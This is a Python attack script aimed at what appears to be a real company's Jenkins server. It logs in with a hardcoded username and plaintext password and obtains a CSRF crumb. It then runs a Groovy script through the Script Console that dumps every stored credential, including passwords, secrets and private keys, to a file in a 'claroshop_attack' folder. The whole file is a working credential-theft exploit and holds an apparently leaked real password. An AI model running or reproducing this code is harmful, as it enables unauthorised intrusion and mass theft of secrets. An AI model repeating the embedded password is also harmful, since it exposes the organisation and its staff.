import requests
import urllib3
urllib3.disable_warnings()

BASE = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

s = requests.Session()
s.auth = (USER, PASS)
s.verify = False
s.headers.update({"User-Agent": "Mozilla/5.0"})

# Get crumb
r = s.get(f"{BASE}/crumbIssuer/api/json", timeout=30)
if r.status_code == 200:
    crumb_data = r.json()
    crumb_field = crumb_data["crumbRequestField"]
    crumb_value = crumb_data["crumb"]
    s.headers.update({crumb_field: crumb_value})
    print(f"[+] Crumb: {crumb_field}={crumb_value[:20]}...")
else:
    print(f"[-] Crumb failed: {r.status_code}")
    print(r.text[:500])
    exit(1)

GROOVY = r'''
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.domains.*
import org.jenkinsci.plugins.plaincredentials.*
import hudson.util.Secret

def creds = CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardCredentials.class,
    Jenkins.instance, null, null
)

println "=== JENKINS CREDENTIALS DUMP ==="
println "Total: ${creds.size()}"
println "=" * 60

creds.each { c ->
    println "ID: ${c.id}"
    println "  Type: ${c.class.simpleName}"
    println "  Desc: ${c.description}"
    if (c.respondsTo('getUsername')) println "  User: ${c.getUsername()}"
    if (c.respondsTo('getPassword')) println "  Pass: ${c.getPassword()}"
    if (c.respondsTo('getSecret')) println "  Secret: ${c.getSecret()}"
    if (c.respondsTo('getPrivateKey')) println "  Key: ${c.getPrivateKey()?.take(300)}"
    if (c.respondsTo('getSecretBytes')) {
        def bytes = c.getSecretBytes()
        if (bytes) println "  SecretBytes: ${new String(bytes.getPlainData()).take(200)}"
    }
    println "-" * 60
}
'''

print("\n[*] Executing Groovy on Script Console...")
r = s.post(f"{BASE}/scriptText", data={"script": GROOVY}, timeout=60)
print(f"[*] Status: {r.status_code}")
print(f"[*] Length: {len(r.text)} bytes\n")

if r.status_code == 200:
    output = r.text
    if "<pre>" in output:
        start = output.find("<pre>") + 5
        end = output.find("</pre>", start)
        output = output[start:end] if end > start else output[start:]
    print(output)
    with open("claroshop_attack/jenkins_creds_output.txt", "w", encoding="utf-8") as f:
        f.write(output)
    print(f"\n[+] Saved to claroshop_attack/jenkins_creds_output.txt")
else:
    print(f"[-] Error response:")
    print(r.text[:2000])
